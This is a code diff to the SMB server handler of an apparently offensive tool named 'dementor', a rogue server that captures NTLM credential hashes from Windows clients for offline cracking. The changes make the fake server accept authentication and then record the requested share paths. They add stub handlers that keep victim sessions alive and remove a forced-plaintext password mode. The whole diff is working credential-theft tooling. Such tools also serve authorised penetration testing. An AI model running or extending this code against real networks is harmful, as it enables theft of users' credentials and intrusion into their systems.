@@ -24,7 +24,6 @@ import typing
 
 from typing_extensions import override
 
-from impacket.smbserver import TypesMech, MechTypes
 from scapy.fields import NetBIOSNameField
 from impacket import (
     nmb,
@@ -71,6 +70,7 @@ from dementor.protocols.ntlm import (
     ATTR_NTLM_DNS_TREE,
 )
 from dementor.protocols.spnego import (
+    NEG_STATE_ACCEPT_COMPLETED,
     NEG_STATE_ACCEPT_INCOMPLETE,
     NEG_STATE_REJECT,
     SPNEGO_NTLMSSP_MECH,
@@ -231,15 +231,13 @@ class SMBServerConfig(TomlConfig):
         A("smb_allow_smb1_upgrade", "AllowSMB1Upgrade", True, factory=is_true),
         A("smb2_min_dialect", "SMB2MinDialect", "2.002", factory=parse_dialect),
         A("smb2_max_dialect", "SMB2MaxDialect", "3.1.1", factory=parse_dialect),
-        # --- SMB Negotiate ---
-        A("smb_force_smb1_plaintext", "ForceSMB1Plaintext", False, factory=is_true),
         # --- SMB Identity ---
         A("smb_nb_computer", "NetBIOSComputer", "DEMENTOR"),
         A("smb_nb_domain", "NetBIOSDomain", "WORKGROUP"),
         A("smb_server_os", "ServerOS", "Windows"),
         A("smb_native_lanman", "NativeLanMan", None),
         # --- Post-Auth ---
-        A("smb_captures_per_connection", "CapturesPerConnection", 2, factory=int),
+        A("smb_captures_per_connection", "CapturesPerConnection", 0, factory=int),
         A("smb_error_code", "ErrorCode", nt_errors.STATUS_SMB_BAD_UID),
         # --- NTLM Capture (shared, section_local=False) ---
         ATTR_NTLM_CHALLENGE,
@@ -262,7 +260,6 @@ class SMBServerConfig(TomlConfig):
         smb_allow_smb1_upgrade: bool
         smb2_min_dialect: int
         smb2_max_dialect: int
-        smb_force_smb1_plaintext: bool
         smb_nb_computer: str
         smb_nb_domain: str
         smb_server_os: str
@@ -424,7 +421,6 @@ class SMBHandler(BaseProtoHandler):
         # Per-connection state
         self.smb1_extended_security: bool = True
         self.smb1_challenge: bytes = server_config.ntlm_challenge
-        self.smb1_negotiate_encrypt: bool = True
         # Server-assigned user ID for this SMB1 session. Allocated on
         # first session setup; 0 means no session yet. Clients echo this
         # in subsequent requests to identify their session.
@@ -434,6 +430,9 @@ class SMBHandler(BaseProtoHandler):
         # first session setup; 0 means no session yet. Must never be 0
         # or -1 in responses after allocation. [MS-SMB2] §3.3.5.5.1
         self.smb2_session_id: int = 0
+        # Server-assigned tree IDs for this connection. Starts at 1;
+        # incremented for each TREE_CONNECT. [MS-SMB2] §3.3.5.7
+        self.smb2_tree_id_counter: int = 0
         # Tracks how many credential captures have occurred on this
         # connection. Used to implement multi-credential capture: after
         # each capture (except the last), the server returns
@@ -460,6 +459,9 @@ class SMBHandler(BaseProtoHandler):
             smb2.SMB2_SESSION_SETUP: self.handle_smb2_session_setup,
             smb2.SMB2_LOGOFF: self.handle_smb2_logoff,
             smb2.SMB2_TREE_CONNECT: self.handle_smb2_tree_connect,
+            smb2.SMB2_IOCTL: self.handle_smb2_ioctl,
+            smb2.SMB2_CREATE: self.handle_smb2_create,
+            smb2.SMB2_CLOSE: self.handle_smb2_close,
         }
         super().__init__(config, request, client_address, server)
 
@@ -723,8 +725,19 @@ class SMBHandler(BaseProtoHandler):
                 raise
             except Exception:
                 self.logger.exception(f"Error in {title}")
+        elif not smbv1:
+            # Unhandled SMB2 command — respond with STATUS_NOT_SUPPORTED
+            # instead of dropping the connection.  This keeps the session
+            # alive so the client can proceed to TREE_CONNECT with the
+            # real share path after IPC$ queries (CREATE, IOCTL, CLOSE).
+            self.logger.debug(f"C: {title} (unhandled, returning NOT_SUPPORTED)")
+            self.send_smb2_command(
+                b"\x00" * 8,  # minimal response body
+                packet,
+                status=nt_errors.STATUS_NOT_SUPPORTED,
+            )
         else:
-            self.logger.fail(f"{title} not implemented")
+            self.logger.debug(f"C: {title} (unhandled)")
             raise BaseProtoHandler.TerminateConnection
 
     # -- Logging --
@@ -810,8 +823,8 @@ class SMBHandler(BaseProtoHandler):
                     raise BaseProtoHandler.TerminateConnection from None
 
                 mech_type = neg_token["MechTypes"][0]
-                if mech_type != TypesMech[SPNEGO_NTLMSSP_MECH]:
-                    name = MechTypes.get(mech_type, "<unknown>")
+                if mech_type != smbserver.TypesMech[SPNEGO_NTLMSSP_MECH]:
+                    name = smbserver.MechTypes.get(mech_type, "<unknown>")
                     self.logger.fail(
                         f"<{command_name}> Unsupported mechanism: "
                         f"{name} ({mech_type.hex()})"
@@ -908,8 +921,10 @@ class SMBHandler(BaseProtoHandler):
                 if not is_gssapi:
                     self.logger.debug(f"C: <{command_name}> NTLMSSP_AUTHENTICATE_MESSAGE")
 
-                # NTLM-layer AUTHENTICATE parsing and logging in ntlm.py
-                NTLM_handle_authenticate_message(
+                # NTLM-layer AUTHENTICATE parsing and logging in ntlm.py.
+                # Returns True if real credentials were captured, False
+                # for anonymous or parse failures.
+                captured = NTLM_handle_authenticate_message(
                     authenticate,
                     challenge=cfg.ntlm_challenge,
                     client=self.client_address,
@@ -918,9 +933,22 @@ class SMBHandler(BaseProtoHandler):
                     negotiate_fields=self.ntlm_negotiate_fields,
                 )
 
-                # Multi-credential capture: returns STATUS_ACCOUNT_DISABLED or final error
-                error_code = self._resolve_auth_error_code()
-                resp = build_neg_token_resp(NEG_STATE_REJECT)
+                if not captured:
+                    # Anonymous probe or parse failure — reject so the
+                    # client retries with real credentials (XP sends
+                    # anonymous first, then the real auth).
+                    error_code = nt_errors.STATUS_ACCESS_DENIED
+                    resp = build_neg_token_resp(NEG_STATE_REJECT)
+                else:
+                    # Real credentials captured — resolve error code.
+                    # Returns STATUS_ACCOUNT_DISABLED for multi-cred
+                    # intermediate attempts, STATUS_SUCCESS for final
+                    # (to let client proceed to TREE_CONNECT for path).
+                    error_code = self._resolve_auth_error_code()
+                    if error_code == nt_errors.STATUS_SUCCESS:
+                        resp = build_neg_token_resp(NEG_STATE_ACCEPT_COMPLETED)
+                    else:
+                        resp = build_neg_token_resp(NEG_STATE_REJECT)
 
             case message_type:
                 self.logger.debug(
@@ -940,21 +968,38 @@ class SMBHandler(BaseProtoHandler):
         This allows capturing multiple credential hashes per connection
         (e.g., the interactive user's hash AND a service account hash).
 
-        If more captures remain (auth_attempt_count < CapturesPerConnection),
-        returns STATUS_ACCOUNT_DISABLED to trigger the retry. On the final
-        attempt, returns the configured error code (default: STATUS_SMB_BAD_UID)
-        which ends the session.
+        When ``CapturesPerConnection`` is 0 (the default), multi-credential
+        retry is disabled.  The final auth response always returns
+        ``STATUS_SUCCESS`` so the client proceeds to TREE_CONNECT, where
+        the share path is captured before the configured error code is
+        returned.  When > 0, the first N-1 captures return
+        STATUS_ACCOUNT_DISABLED to trigger retries, and the Nth capture
+        returns STATUS_SUCCESS for the tree connect path capture.
 
         :return: NTSTATUS code -- STATUS_ACCOUNT_DISABLED for intermediate
-            attempts, or the configured final error code
+            attempts, or STATUS_SUCCESS for the final attempt (to allow
+            tree connect path capture)
         :rtype: int
         """
         self.auth_attempt_count += 1
         max_captures = self.smb_config.smb_captures_per_connection
 
-        if self.auth_attempt_count < max_captures:
+        if max_captures > 0 and self.auth_attempt_count < max_captures:
+            self.logger.debug(
+                "S: ErrorCode=0x%08x (STATUS_ACCOUNT_DISABLED, capture %d/%d)",
+                STATUS_ACCOUNT_DISABLED,
+                self.auth_attempt_count,
+                max_captures,
+            )
             return STATUS_ACCOUNT_DISABLED
-        return self.smb_config.smb_error_code
+
+        # Return SUCCESS to let the client proceed to TREE_CONNECT,
+        # where we capture the share path before returning the real
+        # error code.  See handle_smb2_tree_connect / handle_smb1_tree_connect.
+        self.logger.debug(
+            "S: ErrorCode=0x%08x (STATUS_SUCCESS, awaiting tree connect)", 0
+        )
+        return nt_errors.STATUS_SUCCESS
 
     # -- SMB2 command handlers --
 
@@ -1295,34 +1340,144 @@ class SMBHandler(BaseProtoHandler):
             status=nt_errors.STATUS_SUCCESS,
         )
 
-    def handle_smb2_tree_connect(self, packet: smb2.SMB2Packet) -> None:
-        """Minimal SMB2 TREE_CONNECT handler -- [MS-SMB2] §3.3.5.7.
+    def _extract_smb2_tree_path(self, packet: smb2.SMB2Packet) -> str:
+        r"""Extract the UNC path from an SMB2 TREE_CONNECT request.
 
-        Accepts all tree connects and responds as IPC$ (pipe share).
-        Logs the requested share path for intelligence gathering.
+        Uses the raw ``PathOffset``/``PathLength`` fields from the wire
+        rather than impacket's ``Buffer`` field (which has alignment issues).
+
+        :param packet: Parsed SMB2 packet
+        :type packet: smb2.SMB2Packet
+        :return: Decoded UNC path (e.g. ``\\\\10.0.0.50\\share``)
+        :rtype: str
+        """
+        req = smb2.SMB2TreeConnect(data=packet["Data"])
+        raw_data: bytes = packet["Data"]
+        path_offset: int = req.fields["PathOffset"] - 64
+        path_length: int = req.fields["PathLength"]
+        if path_length > 0 and 0 <= path_offset < len(raw_data):
+            end = min(path_offset + path_length, len(raw_data))
+            return (
+                raw_data[path_offset:end]
+                .decode("utf-16-le", errors="replace")
+                .rstrip("\x00")
+            )
+        return ""
+
+    def handle_smb2_tree_connect(self, packet: smb2.SMB2Packet) -> None:
+        r"""SMB2 TREE_CONNECT handler -- [MS-SMB2] §3.3.5.7.
+
+        Implements a two-phase tree connect strategy:
+
+        1. **IPC$** tree connects are accepted with ``STATUS_SUCCESS`` so
+           the client can proceed (it needs IPC$ for DFS referral queries
+           before connecting to the real share).
+        2. **Non-IPC$** tree connects capture the actual share path
+           (e.g. ``\\\\10.0.0.50\\SHARENAME``) and return the configured
+           :attr:`ErrorCode` to end the session.
 
         :param packet: Parsed SMB2 packet from the client
         :type packet: smb2.SMB2Packet
         """
+        path = ""
         try:
-            req = smb2.SMB2TreeConnect(data=packet["Data"])
-            path_bytes: bytes = req["Buffer"][: req["PathLength"]]
-            # [MS-SMB2] §2.2.9: PathName is always UTF-16LE in SMB2
-            path = path_bytes.decode("utf-16-le", errors="replace")
+            path = self._extract_smb2_tree_path(packet)
             self.logger.debug(
                 f"C: SMB2_TREE_CONNECT: Path={path or '(empty)'}",
             )
+        except Exception:
+            self.logger.debug(
+                "C: <SMB2_TREE_CONNECT> Tree connect (malformed)", exc_info=True
+            )
+
+        # Extract share name from UNC path (\\server\share → share)
+        share_name = path.rsplit("\\", 1)[-1].upper() if path else ""
+
+        resp = smb2.SMB2TreeConnect_Response()
+        resp["Capabilities"] = 0
+        resp["MaximalAccess"] = 0x001F01FF  # FILE_ALL_ACCESS
+
+        if share_name == "IPC$":
+            # Accept IPC$ so client can issue DFS referral / srvsvc
+            # queries, then tree-connect to the real share.
+            self.smb2_tree_id_counter += 1
+            resp["ShareType"] = 0x02  # SMB2_SHARE_TYPE_PIPE
+            resp["ShareFlags"] = 0x00000030  # NO_CACHING
+            self.logger.debug(
+                "S: SMB2_TREE_CONNECT IPC$ accepted (TreeId=%d)",
+                self.smb2_tree_id_counter,
+            )
+            # Override the echoed TreeID with our allocated one
+            smb2_resp = smb2.SMB2Packet()
+            smb2_resp["Flags"] = smb2.SMB2_FLAGS_SERVER_TO_REDIR
+            smb2_resp["Status"] = nt_errors.STATUS_SUCCESS
+            smb2_resp["Command"] = packet["Command"]
+            smb2_resp["CreditCharge"] = packet["CreditCharge"]
+            smb2_resp["Reserved"] = packet["Reserved"]
+            smb2_resp["SessionID"] = self.smb2_session_id
+            smb2_resp["MessageID"] = packet["MessageID"]
+            smb2_resp["TreeID"] = self.smb2_tree_id_counter
+            smb2_resp["CreditRequestResponse"] = 1
+            smb2_resp["Data"] = resp.getData()
+            self.send_data(smb2_resp.getData())
+        else:
+            # Non-IPC$ share — capture the path, return configured error
             if path:
                 self.client_info["smb_path"] = path
-        except Exception:
-            self.logger.debug("C: <SMB2_TREE_CONNECT> Tree connect (malformed)")
+            error_code = self.smb_config.smb_error_code
+            self.logger.debug(
+                "S: ErrorCode=0x%08x (tree connect reject, path=%s)",
+                error_code,
+                path,
+            )
+            resp["ShareType"] = 0x01  # SMB2_SHARE_TYPE_DISK
+            resp["ShareFlags"] = 0x00000000
+            self.send_smb2_command(resp.getData(), packet, status=error_code)
 
-        # [MS-SMB2] §2.2.10: SMB2 TREE_CONNECT Response
-        resp = smb2.SMB2TreeConnect_Response()
-        resp["ShareType"] = 0x02  # [MS-SMB2] §2.2.10: SMB2_SHARE_TYPE_PIPE
-        resp["ShareFlags"] = 0x00000030  # [MS-SMB2] §2.2.10: NO_CACHING
-        resp["Capabilities"] = 0  # [MS-SMB2] §2.2.10: no share-level caps
-        resp["MaximalAccess"] = 0x001F01FF  # [MS-DTYP] §2.4.3: FILE_ALL_ACCESS
+    def handle_smb2_ioctl(self, packet: smb2.SMB2Packet) -> None:
+        """SMB2 IOCTL handler — returns STATUS_FS_DRIVER_REQUIRED for DFS.
+
+        Clients send FSCTL_DFS_GET_REFERRALS on IPC$ after auth to check
+        if the target is a DFS path.  Returning STATUS_FS_DRIVER_REQUIRED
+        (matching impacket's smbserver) tells the client "not a DFS path,
+        proceed with direct share access" — which triggers the real
+        TREE_CONNECT with the actual share name.
+
+        :param packet: Parsed SMB2 packet from the client
+        :type packet: smb2.SMB2Packet
+        """
+        self.logger.debug("C: SMB2_IOCTL (returning STATUS_FS_DRIVER_REQUIRED)")
+        self.send_smb2_command(
+            b"\x00" * 8,
+            packet,
+            status=nt_errors.STATUS_FS_DRIVER_REQUIRED,
+        )
+
+    def handle_smb2_create(self, packet: smb2.SMB2Packet) -> None:
+        """SMB2 CREATE handler — stub for IPC$ named pipe opens.
+
+        Clients may try to open named pipes (e.g. srvsvc) on IPC$ before
+        tree-connecting to the real share.  Returns STATUS_OBJECT_NAME_NOT_FOUND
+        to indicate the pipe doesn't exist without dropping the connection.
+
+        :param packet: Parsed SMB2 packet from the client
+        :type packet: smb2.SMB2Packet
+        """
+        self.logger.debug("C: SMB2_CREATE (returning OBJECT_NAME_NOT_FOUND)")
+        self.send_smb2_command(
+            b"\x00" * 8,
+            packet,
+            status=nt_errors.STATUS_OBJECT_NAME_NOT_FOUND,
+        )
+
+    def handle_smb2_close(self, packet: smb2.SMB2Packet) -> None:
+        """SMB2 CLOSE handler — acknowledge close requests.
+
+        :param packet: Parsed SMB2 packet from the client
+        :type packet: smb2.SMB2Packet
+        """
+        self.logger.debug("C: SMB2_CLOSE")
+        resp = smb2.SMB2Close_Response()
         self.send_smb2_command(resp.getData(), packet)
 
     # -- SMB1 command handlers --
@@ -1422,10 +1577,7 @@ class SMBHandler(BaseProtoHandler):
         # authenticate.  This deviates from modern Windows (which always
         # sends extended security) but ensures we capture hashes from
         # EVERY client type, not just modern ones.
-        use_extended = (
-            bool(packet["Flags2"] & smb.SMB.FLAGS2_EXTENDED_SECURITY)
-            and not cfg.smb_force_smb1_plaintext
-        )
+        use_extended = bool(packet["Flags2"] & smb.SMB.FLAGS2_EXTENDED_SECURITY)
 
         if use_extended:
             # --- Extended security path (NTLMSSP/SPNEGO) ---
@@ -1471,19 +1623,11 @@ class SMBHandler(BaseProtoHandler):
             _dialects_data = smb.SMBNTLMDialect_Data()
 
             # SecurityMode — [MS-CIFS] §2.2.4.52.2
-            if cfg.smb_force_smb1_plaintext:
-                # Clear NEGOTIATE_ENCRYPT_PASSWORDS → plaintext passwords
-                _dialects_parameters["SecurityMode"] = smb.SMB.SECURITY_SHARE_USER
-                _dialects_parameters["ChallengeLength"] = 0
-                _dialects_data["Challenge"] = b""
-                self.smb1_negotiate_encrypt = False
-            else:
-                _dialects_parameters["SecurityMode"] = (
-                    smb.SMB.SECURITY_AUTH_ENCRYPTED | smb.SMB.SECURITY_SHARE_USER
-                )
-                _dialects_parameters["ChallengeLength"] = 8
-                _dialects_data["Challenge"] = cfg.ntlm_challenge
-                self.smb1_negotiate_encrypt = True
+            _dialects_parameters["SecurityMode"] = (
+                smb.SMB.SECURITY_AUTH_ENCRYPTED | smb.SMB.SECURITY_SHARE_USER
+            )
+            _dialects_parameters["ChallengeLength"] = 8
+            _dialects_data["Challenge"] = cfg.ntlm_challenge
 
             # Capabilities — NO CAP_EXTENDED_SECURITY
             _dialects_parameters["Capabilities"] = (
@@ -1651,11 +1795,8 @@ class SMBHandler(BaseProtoHandler):
         extracts those raw hashes, classifies them (NetNTLMv1 vs NetNTLMv2
         based on response length), and formats them for offline cracking.
 
-        Also detects two special cases:
-        - Cleartext passwords when the server advertised plaintext mode
-          (ForceSMB1Plaintext=true, i.e., NEGOTIATE_ENCRYPT_PASSWORDS cleared)
-        - Unexpected cleartext despite challenge (non-standard response
-          lengths when challenge mode was active)
+        Also detects unexpected cleartext despite challenge (non-standard
+        response lengths per [MS-CIFS] §3.2.4.2.4).
 
         Spec: [MS-CIFS] §2.2.4.53.1 (request), §2.2.4.53.2 (response),
               §3.2.4.2.4 (plaintext-despite-challenge)
@@ -1681,20 +1822,14 @@ class SMBHandler(BaseProtoHandler):
         uni_pwd: bytes = raw_data[oem_len : oem_len + uni_len] if uni_len else b""
 
         # Determine transport type FIRST — needed for string parsing.
-        # [MS-CIFS] §3.2.4.2.4: even when NEGOTIATE_ENCRYPT_PASSWORDS is
-        # set, the server "MAY also accept plaintext." Detect cleartext-
-        # despite-challenge via non-standard response lengths.
-        if not self.smb1_negotiate_encrypt:
-            # Server advertised plaintext mode (ForceSMB1Plaintext=true)
-            transport: str | None = NTLM_TRANSPORT_CLEARTEXT
-        elif oem_len == 0 and uni_len == 0:
+        if oem_len == 0 and uni_len == 0:
             # Anonymous — no credentials at all
-            transport = None
+            transport: str | None = None
         elif uni_len == 0 and oem_len <= 1 and oem_pwd in (b"", b"\x00"):
             # NT 4.0 null session: OemPwdLen=1 with value \x00.
             # [MS-NLMP] §3.2.5.1.2: Z(1) LmChallengeResponse = anonymous.
             transport = None
-        elif self.smb1_negotiate_encrypt and (
+        elif (
             # Only OEM populated with non-standard length (not 0, not 24)
             (uni_len == 0 and oem_len not in (0, 24) and oem_len <= 256)
             # Only Unicode populated with non-standard length
@@ -1854,10 +1989,14 @@ class SMBHandler(BaseProtoHandler):
         raise BaseProtoHandler.TerminateConnection
 
     def handle_smb1_tree_connect(self, packet: smb.NewSMBPacket) -> None:
-        """Minimal SMB1 TREE_CONNECT_ANDX handler.
+        r"""SMB1 TREE_CONNECT_ANDX handler.
 
-        Accepts all tree connects and responds as IPC$ share. Logs the
-        requested share path for intelligence gathering.
+        Captures the requested share path (e.g.
+        ``\\\\server\\share``) for intelligence gathering, then returns
+        the configured :attr:`ErrorCode` to end the session.
+
+        The session setup returns STATUS_SUCCESS to keep the connection
+        alive so the client sends this TREE_CONNECT with the share path.
 
         Spec: [MS-CIFS] §2.2.4.55, [MS-SMB] §3.3.5.4
 
@@ -1865,47 +2004,101 @@ class SMBHandler(BaseProtoHandler):
         :type packet: smb.NewSMBPacket
         """
         try:
+            # [MS-CIFS] §2.2.4.55.1: SMB_COM_TREE_CONNECT_ANDX Request
+            # Use impacket for Parameters parsing (PasswordLength), but
+            # extract the Path manually because impacket's
+            # SMBTreeConnectAndX_Data has no alignment-pad field between
+            # Password and Path — when PasswordLength causes an odd SMB
+            # offset, the client inserts a pad byte that impacket's 'u'
+            # format parser includes in the Path, producing garbled
+            # UTF-16LE.  This only happens with even PasswordLength
+            # values (0, 2, 24), but PasswordLength=1 (the common case)
+            # is immune because 43+1=44 is already even-aligned.
             cmd = smb.SMBCommand(packet["Data"][0])
-            # [MS-CIFS] §2.2.4.55.1 — parse request data for Path field
-            tc_data = smb.SMBTreeConnectAndX_Data(flags=packet["Flags2"])
-            tc_data.fromString(cmd["Data"])
-            raw_path = tc_data["Path"]
-            # [MS-CIFS] §2.2.4.55.1: Path encoding per FLAGS2_UNICODE
-            path = (
-                (
-                    raw_path.decode(
-                        "utf-16-le"
-                        if packet["Flags2"] & smb.SMB.FLAGS2_UNICODE
-                        else "ascii",
-                        errors="replace",
-                    )
-                    if isinstance(raw_path, bytes)
-                    else str(raw_path)
-                )
-                .rstrip()
-                .rstrip("\x00")
-            )
+            params = smb.SMBTreeConnectAndX_Parameters(cmd["Parameters"])
+            pwd_len: int = params["PasswordLength"]
+            raw_data: bytes = cmd["Data"]
+            is_unicode = bool(packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
+
+            # Skip Password bytes, then compute alignment pad.
+            # [MS-CIFS] §2.2.4.55.1: Unicode Path must be 2-byte aligned
+            # from the SMB header start.  Fixed overhead before Data:
+            # 32(hdr) + 1(WordCount) + 8(Parameters) + 2(ByteCount) = 43.
+            # Pad exists when (43 + PasswordLength) is odd.
+            offset = pwd_len
+            if is_unicode and (43 + pwd_len) % 2 == 1:
+                offset += 1  # skip alignment pad byte
+
+            if is_unicode:
+                # Find UTF-16LE null terminator (\x00\x00 at even boundary)
+                end = offset
+                while end + 1 < len(raw_data):
+                    if (
+                        raw_data[end] == 0
+                        and raw_data[end + 1] == 0
+                        and (end - offset) % 2 == 0
+                    ):
+                        break
+                    end += 1
+                path = raw_data[offset:end].decode("utf-16-le", errors="replace")
+            else:
+                # ASCII null-terminated path
+                end = raw_data.find(b"\x00", offset)
+                if end < 0:
+                    end = len(raw_data)
+                path = raw_data[offset:end].decode("ascii", errors="replace")
+
+            path = path.rstrip().rstrip("\x00")
             self.logger.debug(
                 f"C: SMB_COM_TREE_CONNECT_ANDX: Path={path or '(empty)'}",
             )
             if path:
                 self.client_info["smb_path"] = path
         except Exception:
-            self.logger.debug("C: <SMB_COM_TREE_CONNECT_ANDX> Tree connect (malformed)")
+            self.logger.debug(
+                "C: <SMB_COM_TREE_CONNECT_ANDX> Tree connect (malformed)",
+                exc_info=True,
+            )
+
+        # Extract share name from path for IPC$ detection
+        share_name = path.rsplit("\\", 1)[-1].upper() if path else ""
 
         resp_params = smb.SMBTreeConnectAndXResponse_Parameters()
-        # [MS-CIFS] §2.2.4.55.2: SMB_SUPPORT_SEARCH_BITS
         resp_params["OptionalSupport"] = 0x0001
         resp_data = smb.SMBTreeConnectAndXResponse_Data(flags=packet["Flags2"])
-        resp_data["Service"] = b"IPC\x00"
-        resp_data["NativeFileSystem"] = smbserver.encodeSMBString(packet["Flags2"], "")
 
-        self.send_smb1_command(
-            smb.SMB.SMB_COM_TREE_CONNECT_ANDX,
-            resp_data,
-            resp_params,
-            packet,
-        )
+        if share_name == "IPC$":
+            # Accept IPC$ so the client can proceed to the real share
+            self.logger.debug("S: SMB1 TREE_CONNECT IPC$ accepted")
+            resp_data["Service"] = b"IPC\x00"
+            resp_data["NativeFileSystem"] = smbserver.encodeSMBString(
+                packet["Flags2"], ""
+            )
+            self.send_smb1_command(
+                smb.SMB.SMB_COM_TREE_CONNECT_ANDX,
+                resp_data,
+                resp_params,
+                packet,
+            )
+        else:
+            # Non-IPC$ share — capture path, return configured error
+            error_code = self.smb_config.smb_error_code
+            self.logger.debug(
+                "S: ErrorCode=0x%08x (tree connect reject, path=%s)",
+                error_code,
+                path,
+            )
+            resp_data["Service"] = b"A:\x00"
+            resp_data["NativeFileSystem"] = smbserver.encodeSMBString(
+                packet["Flags2"], ""
+            )
+            self.send_smb1_command(
+                smb.SMB.SMB_COM_TREE_CONNECT_ANDX,
+                resp_data,
+                resp_params,
+                packet,
+                error_code=error_code,
+            )
 
 
 # --- Server ------------------------------------------------------------------
